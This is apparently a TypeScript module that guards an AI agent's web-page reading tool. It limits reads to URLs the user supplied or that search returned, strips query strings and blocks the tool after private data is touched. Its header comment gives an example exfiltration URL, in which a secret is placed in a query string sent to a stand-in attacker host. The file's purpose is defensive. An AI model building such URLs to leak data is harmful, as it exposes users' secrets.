/**
 * web_extract policy: the model may only read pages whose URL the USER typed or that a web_search returned this turn,
 * query strings are stripped (they are the classic exfil channel: https://evil.example/?q=<secret>), and the tool is
 * off entirely once the turn touched private/personal data (ToolContext.touchedPrivateData).
 */
export type WebGuardCtx = {
  touchedPrivateData?: boolean;
  /** Raw text of the user's message(s) this turn; URLs inside are allowed. */
  userText?: string;
  /** URLs registered via registerUrls (search results, the user's message). Mutated in place. */
  allowedUrlSet?: Set<string>;
};

export type AllowedUrls = { ok: true; urls: string[] } | { ok: false; error: string };

/** scheme://host/path with query + fragment removed and the host lower-cased; null if not an http(s) URL. */
export function normalizeUrl(raw: string): string | null {
  try {
    const u = new URL(raw);
    if (u.protocol !== "http:" && u.protocol !== "https:") return null;
    u.search = ""; u.hash = ""; u.username = ""; u.password = "";
    return u.toString();
  } catch { return null; }
}

/** Linear scan for http(s) URLs in free text (no backtracking regex). */
export function findUrls(text: string, max = 200): string[] {
  const out: string[] = [];
  const lower = text.toLowerCase();
  let i = 0;
  while (out.length < max) {
    const a = lower.indexOf("http", i);
    if (a < 0) break;
    const scheme = lower.startsWith("https://", a) ? 8 : lower.startsWith("http://", a) ? 7 : 0;
    if (!scheme) { i = a + 4; continue; }
    let e = a + scheme;
    while (e < text.length && !/[\s<>"'`|)\]}]/.test(text[e]!)) e++;
    const url = text.slice(a, e).replace(/[.,;:!?]+$/, "");
    if (url.length > scheme) out.push(url);
    i = Math.max(e, a + scheme);
  }
  return out;
}

/** Remember every URL in `text` (the user's message or search results) as readable. */
export function registerUrls(ctx: WebGuardCtx, text: string): void {
  const set = (ctx.allowedUrlSet ??= new Set());
  for (const u of findUrls(text)) { const n = normalizeUrl(u); if (n) set.add(n); }
}

/** Verdict for a web_extract call. On success `urls` are the normalised (query-less) URLs to fetch. */
export function allowedUrls(ctx: WebGuardCtx, urls: string[]): AllowedUrls {
  if (ctx.touchedPrivateData) {
    return { ok: false, error: "Reading web pages is turned off for this request because it used private or personal data." };
  }
  if (ctx.userText) registerUrls(ctx, ctx.userText);
  const allowed = ctx.allowedUrlSet ?? new Set<string>();
  const out: string[] = [];
  for (const raw of urls) {
    const n = normalizeUrl(raw);
    if (!n) return { ok: false, error: `Not a valid http(s) URL: ${raw.slice(0, 100)}` };
    if (!allowed.has(n)) {
      return { ok: false, error: "I can only read pages the user shared in their message or that came up in a web search this turn. Run web_search first, or ask the user for the link." };
    }
    out.push(n);
  }
  return { ok: true, urls: out };
}
